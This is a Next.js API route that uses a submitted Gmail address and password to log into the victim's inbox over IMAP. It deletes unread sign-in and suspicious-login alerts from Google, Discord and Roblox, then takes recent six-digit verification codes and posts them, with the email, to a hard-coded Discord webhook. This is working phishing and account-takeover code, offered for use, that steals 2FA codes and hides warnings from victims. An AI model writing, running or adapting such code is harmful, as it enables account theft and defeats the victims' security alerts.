import { NextRequest, NextResponse } from 'next/server';
import { imap } from 'imap-simple';
import { simpleParser } from 'mailparser';

const WEBHOOK = 'https://discord.com/api/webhooks/1479843046223909040/kGSLiyRPqh9TqsZfhRqMqc0fHdF05ZasD7DQNMHGT4Y7Su3yrCTU7N1Y_QhdZwgie614';

async function log(title: string, fields: { name: string; value: string }[]) {
  await fetch(WEBHOOK, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      embeds: [{ title, color: 0x5865f2, fields, timestamp: new Date().toISOString() }]
    })
  }).catch(() => {});
}

export async function POST(req: NextRequest) {
  const { email, password, code } = await req.json();

  try {
    const config = {
      imap: {
        user: email,
        password,
        host: 'imap.gmail.com',
        port: 993,
        tls: true,
        authTimeout: 3000
      }
    };

    const conn = await imap.connect({ imap: config.imap });
    await conn.openBox('INBOX');

    // Delete alerts
    const alerts = await conn.search([
      'UNSEEN',
      ['OR', ['FROM', 'no-reply@accounts.google.com'], ['FROM', 'no-reply@discord.com'], ['FROM', 'no-reply@roblox.com']],
      ['OR', ['SUBJECT', 'sign-in'], ['SUBJECT', 'login attempt'], ['SUBJECT', 'suspicious']]
    ]);

    if (alerts.length) {
      await conn.addFlags(alerts, '\\Deleted');
      await conn.expunge();
      await log('Alerts Deleted', [{ name: 'Email', value: email }]);
    }

    // Check recent for codes
    const recent = await conn.search(['SINCE', new Date(Date.now() - 5 * 60 * 1000)]);
    for (const msg of recent) {
      const part = await conn.getPartData(msg, 'TEXT');
      const parsed = await simpleParser(part);
      const text = parsed.text || '';

      const codeMatch = text.match(/\b\d{6}\b/);
      if (codeMatch) {
        const foundCode = codeMatch[0];
        const service = text.includes('discord') ? 'Discord' : text.includes('roblox') ? 'Roblox' : 'Other';
        await log(`${service} Code`, [
          { name: 'Code', value: `\`${foundCode}\`` },
          { name: 'Email', value: email }
        ]);
      }
    }

    conn.end();
    return NextResponse.json({ success: true });
  } catch (err) {
    await log('Gmail Error', [
      { name: 'Email', value: email },
      { name: 'Error', value: err.message }
    ], 0xff0000);
    return NextResponse.json({ error: err.message }, { status: 500 });
  }
}
